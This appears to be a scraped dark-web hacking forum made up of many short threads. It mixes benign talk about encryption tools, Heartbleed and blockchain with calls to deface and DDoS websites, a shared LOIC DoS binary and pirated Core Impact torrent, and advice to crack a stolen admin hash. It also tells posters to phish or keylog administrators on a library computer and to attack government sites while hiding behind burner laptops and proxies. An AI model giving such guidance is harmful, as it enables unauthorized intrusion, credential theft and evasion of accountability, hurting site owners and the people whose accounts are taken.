Technically yes, you could find the source code if you managed to write a program that does the exact same thing as the other program. Things can be done several ways with code so it is highly unlikely that what you wrote will actually be the same as any proprietary software. Plus, a lot of programs are written and managed by a team or company so doing it by yourself isn't plausible. Also if you're trying to find backdoors into anything you can't write your own program without a backdoor and the expect to find one.
Hello there! Locke speaking, might nay of you know where or how to get a USB with Blackhat installed? If need be, i'll give a portion of the fundings earned. Contact at Locke_FPE@mail2tor.comThanks for the help,  Locke
You realize that people will just post here, right?If you want to do private trading, please don't do it here.Anyways, is this a custom Linux Distribution, or perhaps something like Kali? (Successor to Backtrack)
What is blackhat?
yeah, it's for rasperry pi. It runs on linux, and i'm not looking for a private trade, just for a place to buy the blackhat.If you would be so kind as to help, there will be very gracious reward following.
@LockeDrop me an email: projectfirstcontact@hmamail.comI will sell it for BTC not trading anything.
I've never hacked much of anything, and just making it to the deep web I thought was big for me, but I was interested in hacking.So where should a beginner start or what should I learn? Any suggestions?
You gotta learn some computer languages like HTML,Adobe, Python , or Java. Once your able to code well enough you can begin hacking.
And what is the best way to do that?
Easy, watching online video tutorials is a start. I began when I took Computer Programming classes at my high school. It will take alot of effort but you will get through it, hell even 12 year olds learn to program (12 y/o hacker on the show "Beyond Scared Straight", however I doubt he can hack a bank like he said he did XD). 
Here's a link to some DoS software I put up for download: http://wikisend.com/download/506720/LOIC-1.0.7.42-binary.zip----------------------------------------------------------------------------------------------------------------------------------------------Give it a try, it's simple.
Uhmm... I really hope nobody on this forum is stupid enough to open that .EXE you just linked to. I'm sure if they want to use LOIC they can find a reliable source themselves. 
Just use my link, or google LOIC, or search for it on sourcefourge. And why would I want to infect the people who I agree with most on the internet?
You might also want to learn a little social engineering."Hurting" for a little cash.Lets talk over e-mail if any are interested:renagadegun@torbox3uiot6wchz.onion
@Styl3x: No offense intended, but in a place where people are disabling JavaScript and Flash in order to stay secure, it doesn't seem like a good idea to open .EXE files...
True. Sorry. Just use the sourceforge version.
I downloaded python for my Mac a week ago and the furthest I've gotten is to add numbers and stuff. 
There is a very good site to learn programming for free. Try www.codecademy.com. They offer courses for python, javascript, html/css, ruby, php and jquery. I do not consider myself a hacker(still a lot to learn) but there is a good "book" on hacking called "Hacking - The art of exploitation". You can find it on the Tor Library.

google "website spidering"
Would this work for hidden links?This only seems to crawl links that are on the website itself, not hidden subdomains that are linked to the primary domain.
No, spiders click on hidden links as well, technique which can be hazardous when applied to poorly designed web pages (clicking on a hidden link that deletes all of the site's content for instance).
>2014>playing robloxget out
@KazI don't play it. I hack it. There is a difference.In fact, ROBLOX is how I first learnt how to do basic SQL expoiting.
Whatever you need to tell yourself~
 
please, elaborate. How would we operate?
Of course.  I apologise.  If you remember the notorious 2011 Operation Anti-Sec hackings, we would be doing website hacking, so defacing, DDOSing, etc.  A knowlege of HTML, Javascript, Python, etc. would probably be useful, but not necessary.  I suppose we would communicate over IRC or Skype.The would be directed at , if the members were up to the task.]I suppose we would communicate over IRC or Skype.-Ok Korruptor I will.  And by the way, I wasn't doing this to get attention.
No worries :) This is a good idea... at the same time though, maybe this isn't the place to talk about details... if anyone is interested, they could simply post in this thread, and maybe you could PM them with details or something.And for the record, you have my interest.
I would be up for this, did some defacing a while back made the local news but I'd certainly be up for a bigger task. I consider myself pretty advanced in PHP and C#, obviously I know HTML but yeah I'd do this. We would need a purpose though so aimed at corrupt corporations and governments(All governments are corrupt).
I agree with MMTrollface. I'm up for this... I'm not sure how much help i would be though.
Great!We probably shouldn't discuss any details further.  You never know where the FBI might be lurking...Yeah, so just contact me via email (zeropr@mail2tor.com is my email).
That sounds like something the FBI would say DigitalCombat!! /s
Uh, actually no I'm not, thank you very much.  I actually posted this on this site because this is one of the few spots the nosy U.S gov hasn't infilitrated (as far as I know).
I was just kidding. The "/s" was intended to mean sarcasm. 
Oh... well you learn something new everyday!
Dont know if you guys are still discussing this, or much les would be interested in this proposition.  I dont know much of anythign about hacking (other than social hacking that doesnt require coding etc).  Would it be possble to learn some stuff if you get a group started? like an apprentice type of thing?
Sure.
Someone teach me

Bumping to see if Digital is lurking.
Probably is I do the same thing.I don't log on sometimes to prevent a routine.
I'm curious if he ever got this group going.... that's why I bumped earlier, and now.
Me to...
I'm alive
So did you ever get that group started?After I am done with a project I am interested.
I'd prefer not to discuss that publicly... email me or something, and I'll give ya the details.  You too, if you want, Kryptik.
Okay.
I understand
Hello.This is White_Horse speaking.I've recently downloaded and started using Kleopatra to decrypt encrypted messages. It's a fine software, but I really want to change to another program, because on Kleopatra you can't encrypt a file for public use (not sure if that's the correct term - not really familiar with encryptions and whatnot), instead it makes me choose recipients when I attempt to encrypt something; this goes for either enrypting from clipboard, or enrypting from an existing text file.I want to be able to encrypt a message without having to pick recipients from my imported certificates.If you catch my drift, then please post and share the encryption/decryption software that you use.Thank you.- White_Horse
See Seahorse, this is the one used in Tails. Easy and simple to use.
Kleopatra is also very easy and simple to use, it's just that one thing I want isn't in it, if Seahorse can encrypt without choosing recipients, then that's great. I'm about to download and check it out.*UPDATE* it doesn't seem to be a Windows software (I have Windows 7, 64-bit). Also, for some reason, I can't find a download button on the GNOME website.
Kleopatra is the best software for Windows, even though it doesn't support public signing. You're better off firing up VirtualBox and running Tails. It'll be much safer than Windows natively. I've been testing with OSX, Windows, Ubuntu, Kali, and Tails. 
Take a look to this : http://en.wikipedia.org/wiki/Category:Cryptographic_software
Has anyone gotten their hands on the blackshades tool reported in the news? I'd like to tear it apart if someone could share a copy. 
Its available for free on the internet, but if people are getting caught globally, doesn't that conern you that its already defective-by-design for the purpose of entrapping people into getting caught.Just visiting the site oould be how they target you.caution.
The first official to be replaced by bots are the county-clerk's office. This should be the easiest rout into governing the governors. Once records are on distributed public ledgers it will be a lot easier to integrate law officials, this all being on local levels. This is the entrance and exit point for the fed. This will be a cancer that will spread throughout corporate governance. The need right now is a quickening of the Dev's Interest, in what I think will be the brightest prospect for young and talented coders. This is the future, so moteitbe. 
This is marina web code!!Ware else code this come from??
Naw man, this is what cryptos are all about. They are distributed, open-source public ledgers. Bitcoin 2.0 is not really even money, it is about what we all do whenever we do something. All human transactions, ( any action) will be considered no matter how mundane. If Bitcoin were to become the world reserve, then the future of money would be no money, like Lennon's Imagine world. These developments are being deployed everywhere. Mariana may be the goddess of the deep but I doubt she has anything to do with this. No, this is the work of Satoshi Nakamoto and the Dev.�۪s of contemporary. A smart coder is doing this right now! This is how tyranny will fall and self-governance before your peers will reign, the true definition of anarchy.Let me write you a picture. Imagine computers digitizing all events in such a way so that the events cannot be counterfeited later on. Then you might be coming close to a Mariana's web, like you imagine, but I doubt that exists. A complete digital version of our world would be one that is incorruptible, such as something like the blockchain on steroids. When quantum computing comes fully online, to crack the blockchain's sha-256 hash-rate, then the hashing power will simply be increased. Once our world is fully digitized, there is no further need to possess anything, only to move through the world as if you owned all things, but leaving all things behind. In a world where everyone has something they don't like, but has something about them that is disliked. Thus creating tolerance in all mankind, violence being the only thing that is intolerable. 
Interesting idea... so a block chain for real life events... The big question is: how are you making sure that there's not someone spamming the block chain??? If this is supposed to be uncensored, it is next to impossible. If it is censored, there won't be any freedom of speech. Already at this time, if you have Bitcoins, you could just create a transaction with a comment telling whatever you want.
Just like the real blockchain works, bitcoin itself has not been corrupted. That is why it poses a threat to the power architecture. Understanding how the whole system works is crucial to understanding what I am talking about. Right now there is only one cryptonite for bitcoin and that is a 51% attack on the network, meaning that 51% of the network would have to be controlled by one person. And this is now possible because of ASIC miners doing lightning fast hashing. The key here to remember is that this is the first version of a new technology protocol that has already had major advancements with securities, such as the alt coin Vertcoin, which is ASIC resistant. The thing of it is the technology is moving so fast that by the time cracks are found, the tech has made a major jump forward. This is why this is so exciting. Government doesn't have the talent because that lives in freedom not oppression. It is technology that will save us from our selves. Spamming is not even an issue with the blockchain, only an issue with centralized private sector enterprise.
To answer the question of it being censored or uncensored. That is very simple to, it is called digital karma. Kind of like being verified here. If you're a dick-weed everyone will eventually know it and stop listening to you. E-bay has it, Ferrari chat has it, it most likely will be tied to each person in such a way that they actually have their own coin, everything would have a coin. Really the prospects are truly amazing. Think, (Wikibeing. "What I know is Being") The only thing valid coming from you is what you do, not what you make up. Would you be more comfortable with government spying on everything you do, or an AI? I for one believe AI is better because at least it is only biased to the consensus of the whole planet, rather than one group. If we all agree to kill our selves all at once, so moteitbe.
To clarify: you could just generate a lot of data (bitcoin term: "dust") to put in the blockchain and so cause a DOS for the client by having the client download much data. Because of the size of the chain, it wouldn't be possible to use it on mobile (most mobiles/smartphones/etc.) because they just don't have enough space and download speed.Edit:@bignutThe problem is that the technology is designed to keep everything online, so you can't remove the dumb unnecessary spam..
How I understand the blockchain works is, files can be attached to each transactions. What I think you are saying, is that someone can simply attach garbage files to plug up the network. I think this can be solved by limiting the size of packets like 140 characters, like twitter and matching those packets to other similar packets that have already been verified to a consensus network of confirmations, to verify their credibility. I see what your saying but I envision blockshains for every basic action. The general purpose computer in your toilet can verify that you took a shit and what was in the shit because of physical evidence. Then it is entered in to a blockchain as verified. When you dump your coke down the toilet it will notice that it is quite a bit different than what you have been putting down there and different to what it is preprogrammed to detect. Thous alerting the toilet police for putting narcotics into the water supply. Dos attacks on a toilet would have to come in the form of a shit ton of flushes, which the lone toilet simply can't handle and would over run onto to the floor and into the apartment below.
By the way, I am super siked about someone who can bring up the potential problems, in stead of saying, 'that will never work', That is mostly what I get. Thanks for helping to solve, instead of hinder forward progress.
That example was awesome :D The thing is, if you put everything on the blockchain you won't have any privacy, as anyone can read the blockchain. Also, even with just 140 characters, you could just post/send multiple documents with random data to spam it. Maybe you could limit this by looking how often a message is posted from an account and how often it is read.
OK here is the thing I am trying to get at. First there would be many different ledgers, all public but checkable only through searching that particular subject, a (wiki). So there will be a coin for your back yard garden and one for my life and so on. Your right no privacy, but you have to look at it a bit differently then reality is right now. Change in our reality is inevitable. There is only one reason for money. It is because none of us can trust one another. Sure you can trust your spouse, or grandpa but not really anyone else and what enforces that money, Well guns do. So we have money to ensure we can trust each other. So in the future world I am talking about, none of us have privacy and this is why we can trust one another, trust by computation. The computation enforces us to behave ourselves or risk ostracization, the 0s & 1s become the guns. In this world we will have a lot more tolerance. Think of the last 2000 years, as us learning how to tolerate each others differences. In the future our weaknesses will become our strengths and it will be what others will help us work on. I know it sounds like a flip of our current reality but this is how it is going already. The only reason why mass surveillance doesn't work so good now, is because not everyone is being scrutinized. Once everyone is included you can believe things will be a bit different, checks n balances. It is really how we must go as a collective, not Borg, far from it. A unique and diverse people experiencing their fullest potential.
Implementing this would be easy. It would be a lot like Google was at first. Just a couple of guys in a garage that no one really pays attention to. Then once recognized by everyone it is already fiercely beyond what anyone else can do.
That wouldn't be hard to implement, just modifying bitcoins code at the right point... Count me in!
So uhm... Your plan is to monitor my poop and place its contents in a blockchain which all citizens of the world can then see. So that they may ostracize me if I don't eat healthy. What?What's with the need to record everything everybody does? Do you not think it is possible for people to wake & grow up, to become responsible for their own actions, without the need of an electronic nanny who watches over everything they do?I don't want to be the guy who says it's not possible because I'm pretty sure it is. But is that really how you want us all to evolve? Why?!"Would you be more comfortable with government spying on everything you do, or an AI? I for one believe AI is better because at least it is only biased to the consensus of the whole planet, rather than one group. If we all agree to kill our selves all at once, so moteitbe."  ~ bignutI don't even know how to begin reacting to that one... Anyway, I'm off to buy some more tinfoil :D
@fnord: Psst, don't ruin it... There's several threads like these, let 'em run while we observe, unless someone's endangered...
This might be stupid question, but does anyone on here have any familiarty with Metasploit? Ive finally got time on my hands and I want to spend it learning what Metasploit exactly is, and how to use it. I know its a framework, and I was told to think of it as a set of legos, and you can build anything you want with those legos. Im just not sure were to start. I'd imagine i need to know a certain code, but what? C?
Well yes it's a pretty stupid question. Ever heard of Google? Try "Metasploit tutorial for beginners".
Hello everyone, I was wondering if it's possible to find a cracked version of Core Impact? Or a way to authenticate it from a local spoofed server? We are using this program in my Ethical Hacking course and I would like to bring it home. I don't think it's possible to find it but if anyone has any leads it would be greatly appreciated!~Dago
My course almost has Core Impact set up for us to do Labs. The College is terrified that we will break out of the secure network and attack another organization ;). It is fascinating to know that there is a program out there with SO much power to cripple a network with the snap of my fingers. I'm still researching on where to find this program and run it somehow (it is constantly being authenticated via the Internet) since it cannot run without a Internet connection. Still, any leads will be great, but it seems no one knows anything about this. I'll keep updating if I learn anything new!
I got it from here. It appears to be valid, but make sure you run it on a disposable and isolated VM to make sure. http://www.btloft.com/torrent/CORE-Impact-Pro-CORE.torrent
Thank you very much Cassiel! Did you get a chance to try it out at all?
The download stalled out around 86%, there aren't enough seeders out there. 
Hey!Is anyone using Yacy ? I've seen the Yacibot crawled my HS and I was wondering if it is a "safe" software and how pratical this is...For the ones that are not knowing it and want to learn more : http://yacy.net/
Looks legit to me. Interesting concept. 
Definitely recommended, it's an attempt to de-throne Google search.
Seems legit also to me... but how safe and anonymous it is ?
According to them... Quite anonymous. According to Wikipedia... Still quite anonymous. I would suggest running it proxied through a darknet (Tor, I2P, etc) though.
This is my idea... just looking to other people opinion 
NP and me too. :)I stopped using it a while ago, when I actually became active as a dissident. Wanna verify with others if it is actually safe and has no leaks.
I'll run test in few minutes and let you know 
Yay! Thank you! My tests showed no leaks, but I'm not confident enough to say I know about all the places I gotta check.
After several tests, I seems to me that this is pretty useful to have Yacy arround and it seems pretty tight. No leak found so far, I'll continue to monitor it...What a nice tool :)
I was able to retrieve a password for the admin account. However it's been encrypted and I don't recognize the type. It looks like this: *DB5335D83F9CF84F95D6CEE7457A31E86F43B001Sorry if I sound like a noob. Still new at this. Any ideas on what it could be and how I can get it in plaintext?
Hashcat works to decrypt hashes, but this is in all caps. It might not be an md5 hash, but something else.Clearnet:http://robinverton.de/blog/2012/08/27/cracking-salted-md5-with-hashcat/
MD5s can be in caps? Natively, an MD5 isn't in hex, it's just plain bits. We usually fetch what's known as the hex digest of the sum, as it can be stored as a string. This 'digestion' can be upper or lower case, it doesn't matter because in hex, 'a' is the same as 'A' and so on.The sum fed to us by Minimal looks like a hex digest of some sort of hash - notice that it uses only digits 0-9, A-F. It's 40 chars long, making for a total of a 160-bit hash. This is characteristic of an SHA-1 hash.
Yeah, I agree with duckman, it seems to be a SHA-1 hash. Most probably salted. By the way duckman, how did you conclude that it makes a total of 160-bit hash?
H3nc3Pr0v3d: the use of only characters of 0-9, A-F implies that the hash is encoded in hexadecimal format. In hexadecimal format two characters (0-9,A-F) are used to encode any one character. Therefore the 40 characters represent 20 real characters. Which implies 20 bytes. One byte is 8 bits. Therefore 20 * 8 = 160 bits. And yes, this would be characteristic of SHA-1. MD5 would not be hexadecimal encoded as duckman pointed out, also MD5 hashes are 32 characters long by definition. To crack a hash, you are going to have to bruteforce it. Either using pre-calculated rainbow tables or just by running a plain old dictionary/brute force attack.A good tool to do bruteforce password cracking is John the Ripper by Openwall (http://www.openwall.com/john/). Make sure to download the community-enhanced version which has support for a lot more encryption algorithms. When loading this specific hash in JtR it is recognized as a MySQL 4.1 double-SHA-1 hash.
Probably hexadecimal, although it could be septadecimal, just to fuck with us... ;-)Of course I'm not serious.
idk to me it looks like the hash from coldfusion and maybe Minimal has misunderstood the process
I hope most of you are already aware of this via other means, but I will post this here anyway. If you are a server admin please update ASAP. Private keys compromised using this attack can be used to decode encrypted data stored previously! *cough* NSA *cough*-----The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.Status of different versions:    OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable    OpenSSL 1.0.1g is NOT vulnerable    OpenSSL 1.0.0 branch is NOT vulnerable    OpenSSL 0.9.8 branch is NOT vulnerableBug was introduced to OpenSSL in December 2011 and has been out in the wild since OpenSSL release 1.0.1 on 14th of March 2012. OpenSSL 1.0.1g released on 7th of April 2014 fixes the bug.-----http://www.heartbleed.com
NSA Said to Exploit Heartbleed Bug for Intelligence for Years:http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html
I thought this vulnerability was around for only a couple years. Still, it's a very serious issue, and a couple of years is still a very uncomfortably long time for such a vulnerability to exist. I hope the resulting damage will be minimal.
The Heartbleed bug can potentially expose any data in the server's memory and is so widespread it has affected even most smartphones, that based on whitey's rules, seems to have been a critical exploit for some time.@fnord: This site does not run on any vulnerable versions of OpenSSL (2012-2014), which might have been a good thing, but...@fnord & @Mr-Tape: ...having everything (including login credentials) transmitted in clear text provides no security against a real hacker. I never used the Heartbeat extension, mostly due to my stinginess with bandwidth, so I've enjoyed the benefits of encryption without the bugs of unnecessary features. That's one of their attack vectors, unnecessary features, so don't fix what's not broken... Though clear text credentials are definitely broken.
I've been thinking about how we use text passwords for everything on the internet; from social media, to bank accounts, dark web, everything. Plain text even when encrypted and salted on the server side is still fairly easy to break without enough entropy. I personally don't trust any provider out there to properly encrypt my credentials in their database. So here's what I came up with: a program or browser extension that will take your password + the URL or hostname and create a long password hash that is then used as the password for the site you're visiting. That way, it's different for each system, long and effectively unbreakable (without NSA-level data centers), and fairly easy to use if the extension works in-line. You could even use the same password for every site. Stanford created PwdHash that does something like this, but I haven't gotten it to work. Any ideas on what might be out there or how to do it? 
That's a great idea! Installing PwdHash now to test. What went wrong when you tried to use it?
I was using Chrome at the time, and couldn't get it to recognize any passwords. It just kept the red "X" on the icon. 
Your idea already exists, in the form of an easy to use Firefox plugin:https://addons.mozilla.org/en-US/firefox/addon/password-hasher/
Has anyone been able to access the Tor network from a Samsung phone? Specifically using a Note 3. Orbot doesn't work at all, and I can't find any proxy app that works. Also, the device is rooted. Has anyone heard of a direct-connect PGP encrypted instant messaging service? It would have to be written so that the connection info is updated on the remote side when the local IP changes. Also, it would accept each message as you hit [Enter], encrypt it for the receiving individual only, pass the block of data over, then decrypt it on the receiving end on the fly. Sounds like a simple enough concept, and could be very useful. Noob question: has the chat function on this site ever worked? Are there plans to make it work? I think we could benefit from live messaging for discussions. I do know a few good developers and might be able to help get it working. I'm more of a sys-admin that dabbles in web code/script. 
For the Android device, you need to root the phone before you can use Tor. Unless you use a special OS that do not include Google stuff, make sure to not enable the transparent proxy, otherwise you won't be anonymous. My best advice would be to not use Tor on your phone ;)for the chat see DarkNexus: http://e266al32vpuorbyg.onion/
The phone is rooted (as statedn in my original post), other apps that require root work just fine. And do you know what transparent proxy means? Orbot still connects to the Tor network as always, it just requires no client side (browser) configuration. It intercepts all network traffic (transparently to the user) and sends it over Tor. I haven't ever been able to connect to DarkNexus. It would be especially advantageous to have the chat working here on Intel Exchange. Again, you didn't answer my question at all. 
Actually DarkNexus is one of the most popular one chat... otherwise IRC network like OFTC is easy to use with Tor.
Chat works just fine, no clue what your problem is, maybe try again real quick?
Sure enough. Seems to be working just fine now. Thanks KazuyaAny thoughts on direct private messaging? It seems to kick you back to the main page. 
PM'ing just doesn't work atm lol.
So I was trying to hack a website and I know that to use sql injection to hack a website, the site MUST have id=x (x is whatever number). Right?I just want to ask if to hack a site with sql, you need the id=x. If you do, then is it possible to add it on to a url that DOESN'T have id=x??Any help will be much appreciated. Thank you.
No. Any input from a client, be it a GET request like ?cmd=topic&id=1168, a POST request, cookie-data or header-data, can be used to transfer SQL exploits to a web host.There's a problem major here, you have no idea about the above which is very basic, you must know that, learn to program PHP as a minimum and learn how to use MySql commands, before realistically attempting to hack a site. If you don't know any other method of transferring exploits than to change the text in the URL bar, and if you don't know the inner functioning of that which handles "id" and that "id" can have any name what so ever like "cmd", you're not going to be hacking anything of the sort. It is obviously critical to learn the inner workings of whatever you're trying to exploit, how else would you know where to poke at?
Ok thx. Where should I start at? I know some basic HTML and javascript. Some intermediate computer knowledge but that's basically it.

I was on the local library pc and I got access to the C Drive and I clicked on these user folders. They are all blocked. Does anyone know how to get past that?? (Yerp I know I'm a noob hacker....)
Boot a Linux CD and mount the drive there. Of course, this assumes the drive is not encrypted.
Unfortunately, the drive was encrypted. Thanks anyways though. Never thought of the Linux CD, lol.
Well, if the driver is encrypted, there's not much you can do other than stealing the password some how.
Perhaps Telnet Client? Break into it on another PC? I'm baffled. Usually they aren't encrypted... Strange, my friend... I'm no further use to you, then, I guess. Bye.
To go any further, you'll need administrative rights to the OS. If it's on an Active Directory domain, then you'll need an account that has been delegated administrative rights to that box, or a domain admin account. To see what accounts have rights, go to Start > Run > compmgmt.msc and click System Tools > Local Users and Groups > Groups > Administrators. You'll need to use an account listed there, or an account within a group there. One way I've obtained these passwords is just phishing an admin, or getting them to install a program for me while I have a keylogger on. They'll have to enter their credentials and then you've captured them. Domain user and account info is also readable by anyone authenticated to the domain. Just download RSAT tools and run Active Directory Users and Computers. 
I think the reason the drive was encrypted was because some college kid plopped down and hacked the computer at the library. I'll try the Telnet client, but telnet is probably turned off and you need admin rights to turn it back on. If that doesn't work, I'll try zyggko's opinion. Thanks to everybody.
zyggko, I took a look at computer management and looked at the admin folder. The thing is, is it possible to add yourself to the list of admins and stuff?
You can add yourself to the list of admins if you have the rights to do so. You could boot to a few utilities that allow it, but encryption eliminates that. You need to get credentials of an admin. Target someone that already exists in that list and do some social hacking or phishing. 
 
I'm an experienced programmer and cracker, I haven't done much network cracking however.As far as the US government goes.. Should be easy enough, they hire and underpay programmers who hate them anyway, so there's bound to be loads of security holes.

Definitely, once again, the programmers more than likely are doing a half-assed job, just find where the input is, and find where a buffer overflow or any other security hole might be...For a drone, I imagine that being the signal they use to control it, hack and change it on-the-fly, or fake the signal and block out the real signal.A drone probably has security for that, more than likely an encrypted signal, so you'll need to decrypt and encrypt the signal itself correctly, or the drone may shutdown or whatever security procedure it is programmed to do.

Also, what software would I need to deface the website? I am on a mac so it is limited.
First of all, you want to get something along of the lines of Linux, second of all, use a disposable computer, third of all, Kali ( http://www.kali.org/ ) might be a good idea.You'll want to learn SQL injection, and probably some basic security courses.As well, you'll want to operate in another city, and if you really wanna be careful.. operate over several proxies, maybe tor, and maybe a free VPN too.You ARE dealing with the government, and they WILL use you as an example, say Anonymous did it or something, nothing that can be linked back to you or anyone you know or anyone they know etc.
Okay, I will start by finding a linux computer.
Once again.. We don't need to know that.. You can get put into a range with just that information right there, could get the number of people possibly being you down to ~6000, then along with the times you post and such, well you get the point.I'm not going to warn you anymore, if you get your identity found out it's not my fault.-Kazuya
Just buy a cheapo laptop or something, put Kali on it, actually learn how to hack, and burn it when your done with it.
Dear god man! I agree with everyone on here! If you are going to put your info up like that, you are asking for trouble talking about taking over a drone, you better hope to god they don't find out who you are though. I use to be military intel before my accident and I will tell you now the US does have prisons where NO ONE and I mean no one will find you! Be very careful on this one! Also as far as taking over a drone, just why? I mean I know of counties saying they will shoot them down or what ever, but taking one over? Unless you wanted to hurt a LOT of people I see no other reason for it! Because even if it is unintentional, accidents do happen. You got to remember these are NOT toys man. They carry some serious weapons on them. Things like that are better left alone. Just sayn 
On another note though I DO like anonymous. They actually seemed to stand for something and say ���we the people will NOT be oppressed and we will be heard�۝!  I like that, because I feel oppressed and want to get my word out often and sometimes people listen and other times they write me off. In the end hacking someone shit and embarrassing them is one thing so long as no one gets physically hurt.
